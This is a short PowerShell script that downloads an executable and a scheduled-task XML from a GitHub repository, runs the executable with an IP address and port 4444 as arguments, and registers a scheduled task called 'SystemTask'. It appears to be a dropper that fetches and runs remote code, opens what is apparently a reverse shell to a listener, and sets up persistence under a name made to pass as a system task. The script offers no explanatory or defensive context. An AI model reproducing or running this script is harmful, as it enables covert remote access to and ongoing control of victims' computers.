$client = new-object System.Net.WebClient
$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.xml'
$file = 'SystemTask.xml'
$client.DownloadFile($url,$file)
$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe' 
$file = 'SystemTask.exe'
$client.DownloadFile($url,$file)
SystemTask.exe "192.168.149.1" "4444"
$command = 'schtasks.exe /create /tn "SystemTask" /xml SystemTask.xml'
iex $command
